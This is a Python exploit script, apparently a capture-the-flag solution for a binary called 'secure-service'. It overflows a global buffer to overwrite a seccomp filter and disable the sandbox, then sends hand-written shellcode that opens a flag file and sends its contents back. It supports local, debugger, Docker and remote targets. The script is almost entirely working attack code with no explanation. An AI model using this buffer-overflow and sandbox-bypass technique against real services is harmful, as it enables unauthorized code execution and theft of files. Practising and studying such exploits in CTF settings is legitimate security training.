#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./secure-service_patched', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw, aslr=False)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw, aslr=False)

gdbscript = '''

b *bof+68
b *sandbox
brva 0x140B

c
'''.format(**locals())

# ==================== EXPLOIT ====================

def init():
    global p

    p = start()

def exploit():

    sl(b'bof')
    payload = b'A' * (exe.symbols['filter'] - exe.symbols['g_buf']) + p64(0x7fff000000000006) * 3 + b'B' * (exe.symbols['seccomp_mode'] - (exe.symbols['filter'] + 8 * 3)) + p64(2)
    sl(payload)

    sl(b'shellcode')

    shellcode = asm('''

        lea rdi, [rip+path]
        xor rax, rax
        xor rsi, rsi
        xor rdx, rdx
        mov al, SYS_open
        syscall

        mov rsi, rax
        mov rdi, 1
        mov r10, 0x100
        xor rdx, rdx
        xor rax, rax
        mov al, SYS_sendfile
        syscall


        path:
            .ascii "/home/secure-service/flag"
            .byte 0

    ''', arch='amd64')


    s(shellcode)

    interactive()

def main():

    init()
    exploit()

if __name__ == '__main__':
    main()
